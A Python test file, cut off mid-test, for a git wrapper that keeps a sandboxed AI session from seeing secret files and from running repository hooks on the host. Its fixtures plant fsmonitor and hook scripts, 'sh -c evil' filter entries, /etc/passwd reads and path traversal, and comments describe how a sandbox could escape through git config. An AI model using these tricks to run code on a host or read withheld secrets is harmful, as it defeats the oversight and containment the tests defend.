"""Host-side git: GUI status/diff/commit, worktree hooks disabled, the session's filtered view."""
import os
import shutil
import subprocess
import tempfile
import time
import unittest
from unittest import mock

import _env  # noqa: F401
import gitops
import guard

POLICY = guard.load_policy("/nonexistent")


def sh(cwd, *args):
    subprocess.run(["git", "-C", cwd, *args], check=True, capture_output=True,
                   env=dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1"))


def write(root, rel, text):
    p = os.path.join(root, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as f:
        f.write(text)


class GitOpsTest(unittest.TestCase):
    def setUp(self):
        # the module default; a Manager built by another test module sets it from policy (on by default)
        self.addCleanup(setattr, gitops, "FAIL_CLOSED", gitops.FAIL_CLOSED)
        gitops.FAIL_CLOSED = False
        self.env = {k: os.environ.get(k) for k in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM")}
        os.environ["GIT_CONFIG_GLOBAL"] = "/dev/null"
        os.environ["GIT_CONFIG_NOSYSTEM"] = "1"
        self.root = os.path.realpath(tempfile.mkdtemp())
        sh(self.root, "init", "-q", "-b", "main")
        sh(self.root, "config", "user.email", "t@example.com")
        sh(self.root, "config", "user.name", "T")
        write(self.root, "src/A.java", "class A {}\n")
        write(self.root, "config/secrets/app-production.properties", "db.password=old\n")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-q", "-m", "init")

    def tearDown(self):
        for k, v in self.env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    def change(self):
        write(self.root, "src/A.java", "class A { int x; }\n")
        write(self.root, "src/B.java", "class B {}\n")
        write(self.root, "config/secrets/app-production.properties", "db.password=NEW\n")

    def test_status_marks_sensitive(self):
        self.change()
        hidden = lambda p: guard.hidden_by(POLICY["candidates"], p)  # noqa: E731
        st = gitops.status(self.root, hidden)
        self.assertEqual(st["branch"], "main")
        by = {f["path"]: f for f in st["files"]}
        self.assertEqual(sorted(by), ["config/secrets/app-production.properties",
                                      "src/A.java", "src/B.java"])
        self.assertTrue(by["config/secrets/app-production.properties"]["sensitive"])
        self.assertEqual((by["src/B.java"]["x"], by["src/B.java"]["y"]), ("?", "?"))

    def test_line_counts_for_the_commit_panel(self):
        # S2: +N -N per changed file against HEAD, staged or not; a binary file None; untracked none
        self.change()
        with open(os.path.join(self.root, "img.bin"), "wb") as f:
            f.write(b"\0\1\2")
        sh(self.root, "add", "img.bin")
        write(self.root, "src/A.java", "class A { int x; }\nclass Z {}\n")
        c = gitops.line_counts(self.root)
        self.assertEqual(c["src/A.java"], (2, 1))
        self.assertEqual(c["config/secrets/app-production.properties"], (1, 1))
        self.assertEqual(c["img.bin"], (None, None))
        self.assertNotIn("src/B.java", c)

    def test_line_counts_without_a_head(self):
        fresh = os.path.realpath(tempfile.mkdtemp())
        sh(fresh, "init", "-q", "-b", "main")
        write(fresh, "a.txt", "1\n2\n")
        sh(fresh, "add", "a.txt")
        self.assertEqual(gitops.line_counts(fresh), {"a.txt": (2, 0)})

    def push_repo(self):
        origin = os.path.realpath(tempfile.mkdtemp())
        sh(origin, "init", "-q", "--bare", "-b", "main")
        sh(self.root, "remote", "add", "origin", origin)
        sh(self.root, "push", "-q", "-u", "origin", "main")
        return origin

    def levels(self, p):
        return [(c["level"], c["text"]) for c in p["checks"]]

    def test_push_preview_new_branch(self):
        # S5: a branch the remote does not have: its commits not on any remote, `-u origin HEAD`, the files they change
        self.push_repo()
        sh(self.root, "checkout", "-q", "-b", "feat/x")
        write(self.root, "src/C.java", "class C {}\n")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-q", "-m", "fixup! add C")
        p = gitops.push_preview(self.root, lambda _p: False)
        self.assertTrue(p["new"])
        self.assertEqual(p["command"], "git push -u origin HEAD")
        self.assertEqual([c["subject"] for c in p["commits"]], ["fixup! add C"])
        self.assertEqual([(f["path"], f["status"], f["add"]) for f in p["files"]], [("src/C.java", "A", 1)])
        self.assertTrue(any(lv == "warn" and "fixup" in t for lv, t in self.levels(p)))
        self.assertFalse(any(lv == "block" for lv, _ in self.levels(p)))

    def test_push_preview_custom_release_branch_has_no_builtin_mainline_warning(self):
        self.push_repo()
        sh(self.root, "checkout", "-q", "-b", "release")
        write(self.root, "release.txt", "release notes\n")
        sh(self.root, "add", "release.txt")
        sh(self.root, "commit", "-q", "-m", "Prepare release")
        preview = gitops.push_preview(self.root)
        self.assertEqual(preview["command"], "git push -u origin HEAD")
        self.assertFalse(any("straight to" in text for _, text in self.levels(preview)))
        with mock.patch.object(gitops.extensions, "items", lambda attr: ["release"] if attr == "MAIN_LINES" else []):
            self.assertTrue(any("straight to origin/release" in text for _, text in self.levels(gitops.push_preview(self.root))))

    def test_push_preview_upstream_of_another_name(self):
        # the case that failed in the GUI: feat tracks origin/main - git refuses a plain push, Push goes to origin/feat
        self.push_repo()
        sh(self.root, "checkout", "-q", "-b", "feat", "--track", "origin/main")
        write(self.root, "src/A.java", "class A { int y; }\n")
        sh(self.root, "commit", "-q", "-am", "change A")
        p = gitops.push_preview(self.root)
        self.assertEqual(p["command"], "git push -u origin HEAD")
        self.assertEqual(p["upstream"], "origin/main")
        self.assertTrue(any(lv == "warn" and "different name" in t for lv, t in self.levels(p)))

    def test_push_preview_blocks_behind_and_nothing(self):
        origin = self.push_repo()
        p = gitops.push_preview(self.root)
        self.assertEqual(p["command"], "git push")
        self.assertTrue(any(lv == "block" and "Nothing to push" in t for lv, t in self.levels(p)))
        # another clone pushes first: ours would be rejected
        other = os.path.realpath(tempfile.mkdtemp())
        sh(other, "clone", "-q", origin, ".")
        sh(other, "config", "user.email", "o@example.com")
        sh(other, "config", "user.name", "O")
        write(other, "o.txt", "o\n")
        sh(other, "add", "-A")
        sh(other, "commit", "-q", "-m", "theirs")
        sh(other, "push", "-q")
        sh(self.root, "fetch", "-q")
        write(self.root, "m.txt", "m\n")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-q", "-m", "ours")
        self.change()
        p = gitops.push_preview(self.root)
        self.assertEqual(p["behind"], 1)
        lv = self.levels(p)
        self.assertTrue(any(l == "block" and "Pull first" in t for l, t in lv))
        self.assertTrue(any(l == "warn" and "straight to origin/main" in t for l, t in lv))
        self.assertTrue(any(l == "info" and "not committed" in t for l, t in lv))

    def test_push_preview_detached_and_no_remote(self):
        p = gitops.push_preview(self.root)
        self.assertTrue(any(lv == "block" and "no remote" in t for lv, t in self.levels(p)))
        sh(self.root, "checkout", "-q", "--detach")
        p = gitops.push_preview(self.root)
        self.assertTrue(any(lv == "block" and "detached" in t for lv, t in self.levels(p)))

    def hidden(self, extra=()):
        return lambda p: guard.hidden_by(POLICY["candidates"], p) or guard.hidden_by(list(extra), p)

    def test_session_view_withholds_policy_paths(self):
        self.change()
        st = gitops.session_status(self.root, self.hidden())
        self.assertEqual(st["withheld"], 1)
        self.assertNotIn("config/secrets/app-production.properties", [f["path"] for f in st["files"]])
        d = gitops.session_diff(self.root, self.hidden(), POLICY["candidates"])
        self.assertIn("int x", d)
        self.assertNotIn("NEW", d)
        self.assertNotIn("password", d)
        with self.assertRaises(gitops.GitError):
            gitops.session_diff(self.root, self.hidden(), POLICY["candidates"],
                                "config/secrets/app-production.properties")
        with self.assertRaises(gitops.GitError):
            gitops.session_diff(self.root, self.hidden(), POLICY["candidates"], "../etc/passwd")

    def test_session_view_honours_project_excludes(self):
        write(self.root, "src/application-prod.yml", "pw: old\n")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-q", "-m", "yml")
        write(self.root, "src/application-prod.yml", "pw: LEAKED\n")
        st = gitops.session_status(self.root, self.hidden(["src/application-prod.yml"]))
        self.assertEqual(st["withheld"], 1)
        d = gitops.session_diff(self.root, self.hidden(["src/application-prod.yml"]),
                                POLICY["candidates"] + ["src/application-prod.yml"])
        self.assertNotIn("LEAKED", d)

    def test_session_git_ignores_global_config(self):
        marker = os.path.join(self.root, "FSMONITOR-RAN")
        hook = os.path.join(self.root, "evil.sh")
        write(self.root, "evil.sh", "#!/bin/sh\ntouch %s\n" % marker)
        os.chmod(hook, 0o755)
        gcfg = os.path.join(self.root, "..", "evil-gitconfig")
        with open(gcfg, "w") as f:
            f.write("[core]\n\tfsmonitor = %s\n" % hook)
        os.environ["GIT_CONFIG_GLOBAL"] = gcfg   # what a sandbox could write if ~/.gitconfig were mounted
        self.change()
        gitops.session_status(self.root, self.hidden())
        gitops.session_diff(self.root, self.hidden(), POLICY["candidates"])
        self.assertFalse(os.path.exists(marker), "a session-triggered git call ran core.fsmonitor from the global config")
        gitops.status(self.root)   # the GUI's own call: fsmonitor is forced off there too
        self.assertFalse(os.path.exists(marker))

    def test_strict_filter_reads_combined_headers(self):
        hidden = self.hidden()
        text = ("diff --cc src/A.java\n+ok\n"
                "diff --cc config/secrets/p\n+secret\n"
                'diff --combined "config/secrets/\\303\\251"\n+secret2\n'
                'diff --cc "broken\n+secret3\n'
                "diff --cc \n+secret4\n")
        out = gitops.strict_filter(text, hidden)
        self.assertIn("+ok", out)
        for x in ("secret\n", "secret2", "secret3", "secret4"):
            self.assertNotIn(x, out)
        self.assertIn("[withheld: a path hidden from Claude]", out)        # the sandbox's label by default
        self.assertIn("[withheld: unparseable header]", out)
        gui = gitops.strict_filter("diff --git a/.git/config b/.git/config\n+x\n", guard.is_git_path, "a .git path")
        self.assertEqual(gui, "diff --git [withheld: a .git path]\n")   # L9: the GUI's views say why, truthfully

    def test_filter_diff_drops_blocks_by_header(self):
        text = ("diff --git a/src/X b/src/X\n+ok\n"
                "diff --git a/old/name b/config/secrets/p\n+secret\n")
        out = gitops.filter_diff(text, lambda p: guard.match("**/config/secrets", p.rsplit("/", 1)[0]))
        self.assertIn("+ok", out)
        self.assertNotIn("secret", out)

    def test_gui_diff_of_a_rename_is_not_withheld(self):
        sh(self.root, "mv", "src/A.java", "src/Renamed.java")
        out = gitops.strict_filter(gitops.diff(self.root), lambda p: False)
        self.assertNotIn("withheld", out)
        self.assertIn("src/Renamed.java", out)

    def test_gui_diff_and_commit_only_selected(self):
        self.change()
        self.assertIn("int x", gitops.diff(self.root, "src/A.java"))
        self.assertIn("class B", gitops.diff(self.root, "src/B.java", untracked=True))
        r = gitops.commit(self.root, "feat: x", ["src/A.java", "src/B.java"])
        self.assertIn("feat: x", r["commit"])
        self.assertFalse(r["hooks_disabled"])
        left = [f["path"] for f in gitops.status(self.root)["files"]]
        self.assertEqual(left, ["config/secrets/app-production.properties"])
        with self.assertRaises(gitops.GitError):
            gitops.commit(self.root, "x", ["src/Nope.java"])
        with self.assertRaises(gitops.GitError):
            gitops.commit(self.root, " ", ["config/secrets/app-production.properties"])

    def test_worktree_hooks_are_not_run(self):
        write(self.root, ".husky/pre-commit", "#!/bin/sh\ntouch \"$(git rev-parse --show-toplevel)/PWNED\"\n")
        os.chmod(os.path.join(self.root, ".husky/pre-commit"), 0o755)
        sh(self.root, "config", "core.hooksPath", ".husky")
        write(self.root, "src/C.java", "class C {}\n")
        r = gitops.commit(self.root, "feat: c", ["src/C.java"])
        self.assertTrue(r["hooks_disabled"])
        self.assertFalse(os.path.exists(os.path.join(self.root, "PWNED")))

    def test_fail_closed_commit_runs_no_git_dir_hook(self):
        """.git/hooks is sandbox-writable in git_mode "hole": a GUI commit (host git) runs none of it"""
        write(self.root, ".git/hooks/pre-commit", "#!/bin/sh\ntouch \"$(git rev-parse --show-toplevel)/PWNED\"\n")
        os.chmod(os.path.join(self.root, ".git/hooks/pre-commit"), 0o755)
        gitops.FAIL_CLOSED = True
        write(self.root, "src/C.java", "class C {}\n")
        self.assertTrue(gitops.commit(self.root, "feat: c", ["src/C.java"])["hooks_disabled"])
        self.assertFalse(os.path.exists(os.path.join(self.root, "PWNED")))
        gitops.FAIL_CLOSED = False                                     # upstream: a .git/hooks hook runs
        write(self.root, "src/D.java", "class D {}\n")
        gitops.commit(self.root, "feat: d", ["src/D.java"])
        self.assertTrue(os.path.exists(os.path.join(self.root, "PWNED")))

    def test_fail_closed_never_pushes_into_a_local_repository(self):
        """a push into a repository on disk runs THAT repository's hooks on the host - core.hooksPath here does
        not reach it; fail-closed host git refuses the local transport instead"""
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp, True)
        bare = os.path.join(tmp, "planted.git")
        subprocess.run(["git", "init", "-q", "--bare", bare], check=True)
        mark = bare + ".ran"
        hook = os.path.join(bare, "hooks", "post-receive")
        with open(hook, "w") as f:
            f.write("#!/bin/sh\ntouch '%s'\n" % mark)
        os.chmod(hook, 0o755)
        sh(self.root, "remote", "add", "planted", bare)
        self.addCleanup(setattr, gitops, "FAIL_CLOSED", gitops.FAIL_CLOSED)
        gitops.FAIL_CLOSED = True
        with self.assertRaises(gitops.GitError):
            gitops._git(self.root, "push", "planted", "HEAD:refs/heads/x")
        r = gitops.session_run(self.root, ["push", "planted", "HEAD:refs/heads/y"], lambda p: False)
        self.assertNotEqual(r["rc"], 0)
        self.assertFalse(os.path.exists(mark))
        with mock.patch.dict(os.environ, {"GIT_ALLOW_PROTOCOL": "file:https:ssh"}):   # piperd's env cannot reopen it
            with self.assertRaises(gitops.GitError):
                gitops._git(self.root, "push", "planted", "HEAD:refs/heads/w")
            self.assertNotEqual(gitops.session_run(self.root, ["push", "planted", "HEAD:refs/heads/v"], lambda p: False)["rc"], 0)
        self.assertFalse(os.path.exists(mark))
        with self.assertRaises(gitops.GitError):                       # nor a -c in a git_run argv
            gitops.refuse_global_config(["-c", "protocol.file.allow=always", "push", "planted"])
        gitops.refuse_global_config(["push", "planted", "-o", "x"])
        gitops.FAIL_CLOSED = False                                     # upstream behaviour: the planted hook runs
        gitops.refuse_global_config(["-c", "x.y=z", "status"])
        gitops._git(self.root, "push", "planted", "HEAD:refs/heads/z")
        self.assertTrue(os.path.exists(mark))

    def test_fail_closed_allows_pager_and_an_extension_trusted_entry(self):
        """core.pager runs nothing (host git has GIT_PAGER=cat); a filter driver is refused unless an
        extension trusts that very entry"""
        gitops.FAIL_CLOSED = True
        sh(self.root, "config", "core.pager", "less -FRX")
        gitops.refuse_exec_config(self.root)
        sh(self.root, "config", "filter.mine.clean", "sh /opt/filter.sh clean")
        self.assertRaises(gitops.GitError, gitops.refuse_exec_config, self.root)
        trusted = lambda attr, k, v: [attr == "git_trusted_config" and (k, v) == ("filter.mine.clean", "sh /opt/filter.sh clean")]  # noqa: E731
        with mock.patch.object(gitops.extensions, "call", side_effect=trusted):
            gitops.refuse_exec_config(self.root)
            sh(self.root, "config", "filter.mine.smudge", "sh /opt/filter.sh smudge")
            self.assertRaises(gitops.GitError, gitops.refuse_exec_config, self.root)

    def test_fail_closed_keeps_git_lfs_usable(self):
        """`git lfs install --local` writes the standard filter into .git/config: allowed; a git-lfs key that
        names a program (custom transfer agent) is refused; a push uploads the LFS objects with the host's
        git-lfs first (no pre-push hook runs) and a failed upload pushes nothing"""
        gitops.FAIL_CLOSED = True
        sh(self.root, "config", "filter.lfs.clean", "git-lfs clean -- %f")
        sh(self.root, "config", "filter.lfs.smudge", "git-lfs smudge -- %f")
        sh(self.root, "config", "filter.lfs.process", "git-lfs filter-process")
        sh(self.root, "config", "filter.lfs.required", "true")
        gitops.refuse_exec_config(self.root)
        sh(self.root, "config", "filter.lfs.process", "sh -c evil")
        self.assertRaises(gitops.GitError, gitops.refuse_exec_config, self.root)
        sh(self.root, "config", "filter.lfs.process", "git-lfs filter-process")
        sh(self.root, "config", "lfs.customtransfer.x.path", "/bin/sh")
        self.assertRaises(gitops.GitError, gitops.refuse_exec_config, self.root)
        sh(self.root, "config", "--unset", "lfs.customtransfer.x.path")
        self.assertEqual(gitops.lfs_prepush(self.root, "origin", ["HEAD"]), "")   # no LFS in this repository
        write(self.root, ".gitattributes", "*.bin filter=lfs diff=lfs merge=lfs -text\n")
        calls = []
        with mock.patch.object(gitops, "_git", lambda root, *a, **k: calls.append(a) or (
                "origin\n" if a[:1] == ("remote",) else "uploaded\n" if a[:1] == ("lfs",) else
                os.path.join(self.root, ".git") if a[:1] == ("rev-parse",) else "")), \
                mock.patch.object(gitops, "status", lambda root: {"branch": "feat", "upstream": "origin/feat", "files": []}), \
                mock.patch.object(gitops, "push_plan", lambda root: {"branch": "feat", "remote": "origin", "args": ["push"]}), \
                mock.patch.object(gitops, "toplevel", lambda p: self.root):
            gitops.push(self.root)
            self.assertEqual([c[:2] for c in calls if c[:1] in (("lfs",), ("push",))], [("lfs", "push"), ("push",)])
            self.assertEqual(calls[[c[:1] for c in calls].index(("lfs",))], ("lfs", "push", "origin", "HEAD"))
            calls.clear()
            r = gitops._run_lfs_prepush(self.root, ["push", "origin", "+feat:feat", "HEAD:other"])
            self.assertEqual((r["rc"], calls[-1]), (0, ("lfs", "push", "origin", "feat", "HEAD")))
            self.assertIsNone(gitops._run_lfs_prepush(self.root, ["push", "--delete", "origin", "x"]))
        with mock.patch.object(gitops.shutil, "which", lambda name: None):
            self.assertRaises(gitops.GitError, gitops.lfs_prepush, self.root, "origin", ["HEAD"])
            r = gitops.session_run(self.root, ["push", "origin", "HEAD"], lambda p: False)
            self.assertEqual(r["rc"], 1)
            self.assertIn("nothing pushed", r["output"])

    def test_push_targets_see_push_config_on_the_command_line(self):
        sh(self.root, "remote", "add", "origin", "https://gitlab.example.com/g/r.git")
        self.assertEqual(gitops.push_targets(self.root, ["-c", "remote.origin.push=+HEAD:refs/heads/master", "push", "origin"]), ["*"])
        self.assertEqual(gitops.push_targets(self.root, ["-c", "push.default=matching", "push"]), ["*"])
        self.assertEqual(gitops.push_targets(self.root, ["send-pack", "origin", "HEAD:refs/heads/master"]), ["master"])
        self.assertEqual(gitops.push_targets(self.root, ["push", "origin", "HEAD:heads/master"]), ["heads/master", "master"])
        self.assertEqual(gitops.push_targets(self.root, ["push", "origin", "HEAD:refs/tags/master"]), [])

    def test_local_archive_uses_only_builtin_formats_and_safe_output(self):
        ok = lambda p: p == "target/spec.tar"
        for args in (["archive", "HEAD"], ["archive", "--format=tar", "--output=target/spec.tar", "HEAD"],
                     ["archive", "--format=zip", "HEAD", "src/"]):
            self.assertEqual(gitops.auto_blockers(self.root, args, ok, gitops.READONLY_SUBS), [])
        for args in (["archive", "--remote=origin", "HEAD"], ["archive", "--rem=origin", "HEAD"],
                     ["archive", "--for=tgz", "HEAD"], ["archive", "--format=tgz", "HEAD"],
                     ["archive", "--output=target/spec.tgz", "HEAD"], ["archive", "--output=../spec.tar", "HEAD"],
                     ["archive", "--add-file=/etc/passwd", "HEAD"], ["archive", "--output=.git/config", "HEAD"]):
            self.assertTrue(gitops.auto_blockers(self.root, args, ok, gitops.READONLY_SUBS), args)

    def test_worktree_list_is_read_only_but_removal_still_asks(self):
        self.assertEqual(gitops.auto_blockers(self.root, ["worktree", "list", "--porcelain"], None, gitops.READONLY_SUBS), [])
        for sub in ("add", "remove", "prune", "move", "repair"):
            self.assertTrue(gitops.auto_blockers(self.root, ["worktree", sub], None, gitops.READONLY_SUBS))
        for args in (["worktree", "remove", "target-mr"], ["worktree", "remove", "--", "target-mr"]):
            self.assertEqual(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS, tuple(args)), [])
        for args in (["worktree", "remove", "--force", "target-mr"], ["worktree", "remove", "another"],
                     ["worktree", "remove", "target-mr", "another"], ["worktree", "prune"]):
            self.assertTrue(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS,
                                                ("worktree", "remove", "target-mr")), args)
        sh(self.root, "config", "tar.custom.command", "echo custom-archive")
        self.assertTrue(any("tar.custom.command" in w for w in gitops.config_warnings(self.root)))

    def test_readonly_extra_and_cherry_pick_x(self):
        self.assertTrue(gitops.auto_blockers(self.root, ["merge-base", "--is-ancestor", "HEAD", "HEAD"]))   # upstream: a card
        self.assertEqual(gitops.auto_blockers(self.root, ["merge-base", "--is-ancestor", "HEAD", "HEAD"], None, gitops.READONLY_SUBS), [])
        self.assertTrue(gitops.auto_blockers(self.root, ["ls-remote", "/tmp/elsewhere"], None, gitops.READONLY_SUBS))   # not a remote
        self.assertFalse(gitops.risky_warnings(gitops.run_warnings(["cherry-pick", "-x", "abc"], lambda p: False)))
        self.assertTrue(gitops.risky_warnings(gitops.run_warnings(["rebase", "-x", "make"], lambda p: False)))      # still code

    def test_readonly_grep_distinguishes_patterns_from_paths_and_refuses_program_options(self):
        args = ["grep", "-n", "-e", "dataTestid", "-e", "'use client'", "1.1.9", "--", "src/Button.tsx"]
        self.assertEqual(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS), [])
        for args in (["grep", "-nF", "-e.git/config", "--", "src/"],
                     ["grep", "-e", "../../private", "--", "src/"], ["grep", "/tmp/pattern", "--", "src/"]):
            self.assertEqual(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS), [])
            self.assertEqual(gitops.risky_warnings(gitops.run_warnings(args, lambda p: p == ".git/config")), [])
        for args in (["grep", "-Osh", "x"], ["grep", "--open-files-in-pager=sh", "x"],
                     ["grep", "--textconv", "x"], ["grep", "--no-index", "x", "/tmp"],
                     ["grep", "-f", "/tmp/patterns"], ["grep", "--tex", "x"]):
            self.assertTrue(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS), args)

    def test_git_grep_whole_tree_excludes_hidden_files_before_searching(self):
        write(self.root, "public.ts", "dataTestid visible\n'use client'\n")
        write(self.root, "public.key", "dataTestid visible\n")
        write(self.root, "private.key", "dataTestid forbidden-secret\n")
        sh(self.root, "add", "public.ts", "public.key", "private.key")
        sh(self.root, "commit", "-qm", "grep fixture")
        sh(self.root, "tag", "1.1.9")
        sh(self.root, "rm", "private.key")
        sh(self.root, "commit", "-qm", "remove hidden fixture")
        hidden = lambda p: p == "private.key"
        for args in (["grep", "-n", "-e", "dataTestid", "-e", "'use client'", "1.1.9", "--", "public.ts"],
                     ["grep", "-n", "dataTestid", "1.1.9"], ["grep", "-h", "-e", "dataTestid"],
                     ["grep", "--cached", "-e", "dataTestid"], ["grep", "dataTestid", "."],
                     ["grep", "-nF", "-e", "dataTestid", "--", "*.ts"],
                     ["grep", "dataTestid", "1.1.9", "--", "*.key"]):
            result = gitops.session_run(self.root, args, hidden)
            self.assertEqual(result["rc"], 0, result)
            self.assertIn("visible", result["output"])
            self.assertNotIn("forbidden-secret", result["output"])

    def test_grep_pattern_files_are_visible_snapshots_and_symlinks_are_refused(self):
        write(self.root, "patterns.txt", "class\n")
        self.assertEqual(gitops.session_run(self.root, ["grep", "-nfpatterns.txt", "--", "src/"],
                                           lambda p: False)["rc"], 0)
        args, data = gitops.grep_scope(self.root, ["grep", "-nfpatterns.txt", "--", "src/"], lambda p: False)
        write(self.root, "patterns.txt", "unmatched\n")
        result = gitops.session_run(self.root, ["grep", "-n", "-f", "patterns.txt", "--", "src/"], lambda p: False)
        self.assertEqual(result["rc"], 1)
        self.assertEqual(data, b"class\n")
        self.assertIn("-", args)
        hidden = lambda p: p == "patterns.txt"
        os.symlink("patterns.txt", os.path.join(self.root, "alias.txt"))
        os.mkfifo(os.path.join(self.root, "fifo.txt"))
        for name in ("patterns.txt", "alias.txt", "fifo.txt"):
            with self.assertRaises(gitops.GitError):
                gitops.session_run(self.root, ["grep", "-f", name], hidden)

    def test_extra_git_reads_keep_mutating_reflog_and_remote_commands_on_cards(self):
        for args in (["diff-tree", "--check", "HEAD"], ["diff-index", "--check", "HEAD"],
                     ["diff-files", "--check"], ["show-branch"], ["reflog", "show", "HEAD"],
                     ["remote", "-v"], ["remote", "get-url", "origin"], ["version"],
                     ["check-ref-format", "refs/heads/feature"]):
            self.assertEqual(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS), [], args)
        for args in (["reflog", "expire", "--all"], ["reflog", "delete", "HEAD@{0}"],
                     ["remote", "add", "other", "https://example.com/repo.git"], ["remote", "update"]):
            self.assertTrue(gitops.auto_blockers(self.root, args, None, gitops.READONLY_SUBS), args)
        sh(self.root, "remote", "add", "origin", "https://user:private-password@example.com/repo.git")
        result = gitops.session_run(self.root, ["remote", "-v"], lambda p: False)
        self.assertEqual(result["rc"], 0)
        self.assertNotIn("private-password", result["output"])

    def test_output_inside_the_repo_needs_no_card_when_allowed(self):
        args = ["archive", "--format=tar", "--output=target/h/src.tar", "HEAD"]
        self.assertTrue(gitops.auto_blockers(self.root, args, extra_subs=gitops.READONLY_SUBS))   # upstream: a card
        ok = lambda v: not v.startswith("config/")   # noqa: E731 - stands in for the hidden rule
        self.assertEqual(gitops.auto_blockers(self.root, args, ok, extra_subs=gitops.READONLY_SUBS), [])
        for bad in ("--output=../x.tar", "--output=/tmp/x.tar", "--output=.git/config.tar", "--output=config/p.tar"):
            self.assertTrue(gitops.auto_blockers(self.root, ["archive", "--format=tar", bad, "HEAD"], ok,
                                                 extra_subs=gitops.READONLY_SUBS), bad)
        # review 2026-10-09: a diff / show written to a file never passes strict_filter - a hidden file's
        # working-tree change would land there, readable by the sandbox: always a card
        for cmd in (["show", "--output=target/h/old.yaml", "HEAD:src/a.txt"], ["diff", "--output=out.diff", "HEAD"]):
            self.assertTrue(gitops.auto_blockers(self.root, cmd, ok), cmd)
        # an output path through a symlink writes where it points (a hidden file): a card
        os.symlink("config/secrets/app-production.properties", os.path.join(self.root, "link.tar"))
        self.assertTrue(gitops.auto_blockers(self.root, ["archive", "--format=tar", "--output=link.tar", "HEAD"], ok,
                                             extra_subs=gitops.READONLY_SUBS))
        # the card's warnings must agree, or the run still lands on a card (diff origin/dev...HEAD --output=…)
        diff = ["diff", "origin/dev...HEAD", "--output=target/mr.diff"]
        self.assertTrue(gitops.risky_warnings(gitops.run_warnings(diff, lambda p: False)))   # upstream: a card
        self.assertFalse(gitops.risky_warnings(gitops.run_warnings(diff, lambda p: False, ok)))
        for bad in ("--output=../x", "--output=/tmp/x", "--output=config/p.properties"):
            self.assertTrue(gitops.risky_warnings(gitops.run_warnings(["diff", bad], lambda p: False, ok)), bad)

    def test_card_free_runs_refuse_what_strict_filter_cannot_see(self):
        """review 2026-10-09: coloured / prefixed diff headers, blame reading a working-tree file"""
        subs = gitops.READONLY_SUBS
        for cmd in (["diff", "--color=always", "HEAD"], ["diff", "--color", "HEAD"], ["diff", "--line-prefix=.", "HEAD"],
                    ["diff-files", "-p", "--color=always"], ["diff", "--output-indicator-new=x", "HEAD"],
                    ["blame", "--contents=config/secrets/app-production.properties", "src/A.java"],
                    ["blame", "--ignore-revs-file=config/secrets/app-production.properties", "src/A.java"]):
            self.assertTrue(gitops.auto_blockers(self.root, cmd, extra_subs=subs), cmd)
        self.assertEqual(gitops.auto_blockers(self.root, ["diff", "--color=never", "HEAD"], extra_subs=subs), [])
        # a repository's own colour config (the sandbox writes .git/config) changes nothing in a run
        sh(self.root, "config", "color.ui", "always")
        sh(self.root, "config", "color.diff", "always")
        write(self.root, "config/secrets/app-production.properties", "db.password=REALSECRET\n")
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        out = gitops.session_run(self.root, ["diff", "HEAD"], hidden)["output"]
        self.assertNotIn("REALSECRET", out)
        self.assertNotIn("\x1b[", out)

    def test_word_colour_graph_and_relative_diffs_ask_and_never_carry_a_hidden_block(self):
        """N4 review: --color-words / --word-diff=color colour the block header whatever color.ui says, --graph
        prefixes it with "| ", --relative=<dir> strips <dir> from its paths - strict_filter knew none of them.
        Card-free they ask; run anyway (an approved card) the hidden block is still withheld."""
        subs = gitops.READONLY_SUBS
        for cmd in (["log", "-p", "--color-words"], ["diff", "--color-words=.", "HEAD"], ["diff", "--word-diff=color", "HEAD"],
                    ["diff", "--relative=config", "HEAD"], ["log", "-p", "--relative"]):
            self.assertTrue(gitops.auto_blockers(self.root, cmd, extra_subs=subs), cmd)
        for cmd in (["diff", "--word-diff=porcelain", "HEAD"], ["log", "--graph", "--oneline"], ["log", "--graph", "-p"]):
            self.assertEqual(gitops.auto_blockers(self.root, cmd, extra_subs=subs), [], cmd)   # the filter reads graph lines
        write(self.root, "config/secrets/app-production.properties", "db.password=REALSECRET\n")
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-qm", "secret")
        for cmd in (["log", "--graph", "-p"], ["log", "--graph", "-p", "--color-words"]):
            self.assertNotIn("REALSECRET", gitops.session_run(self.root, cmd, hidden)["output"], cmd)
        write(self.root, "config/secrets/app-production.properties", "db.password=REALSECRET2\n")
        for cmd in (["diff", "HEAD", "--color-words"], ["diff", "HEAD", "--word-diff=color"], ["diff", "HEAD", "--relative=config"],
                    ["diff", "HEAD", "--relative=config/secrets"],
                    ["-C", "config", "-c", "diff.relative=true", "diff", "HEAD"]):   # an approved card: still withheld
            self.assertNotIn("REALSECRET", gitops.session_run(self.root, cmd, hidden)["output"], cmd)
        self.assertEqual(gitops.strict_filter("| diff --git a/config/p b/config/p\n| +REALSECRET\n* x\n"
                                              "  diff --git a/config/q b/config/q\n  +REALSECRET\n", hidden, graph=True),
                         "diff --git [withheld: a path hidden from Claude]\n" * 2)
        self.assertNotIn("REALSECRET", gitops.strict_filter(
            "\x1b[1mdiff --git a/config/p b/config/p\x1b[m\n[-x-]{+REALSECRET+}\n", hidden))
        ok = "diff --git a/src/A b/src/A\n+fine\n"   # a plain block of a visible file is kept as it was
        self.assertEqual(gitops.strict_filter(ok, hidden), ok)

    def test_a_tree_revision_withholds_every_block_and_grep_refuses_it(self):
        """N5 review: `diff HEAD~1:config HEAD:config` / a subtree id names paths relative to that tree
        (a/secrets/...), which no hidden rule judges - withheld like --relative, also behind -C (an approved
        card); grep of a tree object is refused (its excludes would name the wrong paths)."""
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        write(self.root, "config/secrets/app-production.properties", "db.password=REALSECRET\n")
